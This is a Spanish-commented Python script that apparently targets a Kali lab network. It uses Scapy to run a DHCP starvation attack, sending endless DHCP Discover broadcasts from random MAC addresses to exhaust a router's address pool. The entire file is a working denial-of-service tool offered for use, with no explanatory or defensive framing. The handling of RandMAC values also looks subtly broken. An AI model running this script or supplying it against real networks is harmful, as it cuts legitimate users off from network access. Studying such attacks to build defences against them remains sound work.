#!/usr/bin/env python3
from scapy.all import *
import random

# Interfaz de Kali (ajusta si no es eth0)
interface = "eth0"

# Dirección MAC aleatoria para simular múltiples clientes
def random_mac():
    return RandMAC()

# Dirección IP de broadcast
broadcast = "255.255.255.255"

# IP del router (gateway)
router_ip = "192.168.120.1"

# Función para enviar solicitudes DHCP
def dhcp_starvation():
    while True:
        # Generar MAC aleatoria
        mac = random_mac()

        # Crear paquete DHCP Discover
        ether = Ether(src=mac, dst="ff:ff:ff:ff:ff:ff")
        ip = IP(src="0.0.0.0", dst=broadcast)
        udp = UDP(sport=68, dport=67)
        bootp = BOOTP(chaddr=bytes.fromhex(mac.replace(":", "")), xid=random.randint(1, 900000000), flags=0x8000)
        dhcp = DHCP(options=[("message-type", "discover"), ("end")])

        pkt = ether / ip / udp / bootp / dhcp

        sendp(pkt, iface=interface, verbose=0)
        print(f"[+] DHCP Discover enviado con MAC {mac}")

# Ejecutar ataque
if __name__ == "__main__":
    dhcp_starvation()